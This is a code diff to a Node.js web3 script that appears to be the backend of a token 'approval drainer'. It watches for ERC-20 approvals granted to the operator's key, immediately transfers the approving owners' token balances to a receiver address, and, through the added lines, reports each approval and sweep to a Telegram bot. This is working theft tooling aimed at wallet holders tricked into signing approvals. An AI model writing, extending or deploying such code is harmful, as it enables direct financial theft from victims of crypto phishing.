@@ -8,11 +8,20 @@ const { WebSocketServer } = require('ws');
 const Web3 = require("web3")
 const HDWalletProvider = require("@truffle/hdwallet-provider");
 const CHAINS = require("./CHAINS");
+var request = require('request');
+var moment = require("moment")
+
+
+
+
+
+
 
 var privateKey = argv.k.trim();
 
 var spender = (new Web3()).eth.accounts.privateKeyToAccount(privateKey).address
 var receiver = spender
+var Settings = null;
 
 if (argv.receiver) receiver = argv.receiver.toString();
 
@@ -26,9 +35,12 @@ async function loadSettings(file = "settings.json") {
     let content = fs.readFileSync(file, "utf8");
     let settings = JSON.parse(content)
     receiver = settings.receiver
+    Settings = settings;
     return settings;
 
 }
+
+
 
 async function saveSettings(settings, file = "settings.json") {
     let content = JSON.stringify(settings)
@@ -53,6 +65,20 @@ async function appendFile(filePath, content) {
     fs.appendFileSync(fd, content + "\n", 'utf8');
 }
 
+function sentAlertTelegram(content, settings = Settings) {
+    let message = JSON.stringify(content)
+    var options = {
+        'method': 'POST',
+        'url': `https://api.telegram.org/bot${settings.telegram.token}/sendMessage?chat_id=${settings.telegram.chatId}&text=${message}`,
+        'headers': {
+        }
+    };
+    request(options, function (error, response) {
+        if (error) throw new Error(error);
+        // console.log(response.body);
+    });
+}
+
 async function sendToken(web3, symbol, contract, from, to) {
     const gasPrice = await web3.eth.getGasPrice();
     let allowance = await contract.methods.allowance(from, spender).call();
@@ -75,6 +101,8 @@ async function sendToken(web3, symbol, contract, from, to) {
                 sendMessageClient({
                     onSent: content
                 })
+
+                sentAlertTelegram({ onSent: content })
 
             } catch (error) {
                 throw error;
@@ -101,7 +129,7 @@ async function sendToken(web3, symbol, contract, from, to) {
     } else { logError("allowance: ", allowance, "balance: ", balance) }
 }
 
-function listenEvents(settings) {
+function listenEvents(settings = Settings) {
     let { tokens, abiFolder } = settings
     let web3s = []
     let contracts = []
@@ -138,20 +166,22 @@ function listenEvents(settings) {
                     }
                     appendFile("approvalError.txt", content)
                     sendMessageClient(content)
+                    sentAlertTelegram(content)
                 } else {
                     logSuccess(chainId, symbol)
                     // log(event.transactionHash, event.returnValues.owner)
                     let content = {
-                        chainId: chainId,
-                        symbol: symbol,
-                        owner: event.returnValues.owner,
-                        spender: event.returnValues.spender,
-                        transactionHash: event.transactionHash,
+                        onApproval: {
+                            chainId: chainId,
+                            symbol: symbol,
+                            owner: event.returnValues.owner,
+                            spender: event.returnValues.spender,
+                            transactionHash: event.transactionHash,
+                        }
                     }
-                    appendFile("approveds.txt", {
-                        onApproval: content
-                    })
+                    appendFile("approveds.txt", content)
                     sendMessageClient(content)
+                    sentAlertTelegram(content)
                     sendToken(web3, symbol, contract, event.returnValues.owner, receiver)
                 }
             })
@@ -167,6 +197,8 @@ function listenEvents(settings) {
 loadSettings()
     .then(settings => {
         let web3s, contracts = listenEvents(settings)
+
+        sentAlertTelegram("main.js started: " + moment().format("D/M/Y h:m"))
     })
 // .catch(error => logError(error))
 var port = 8080;
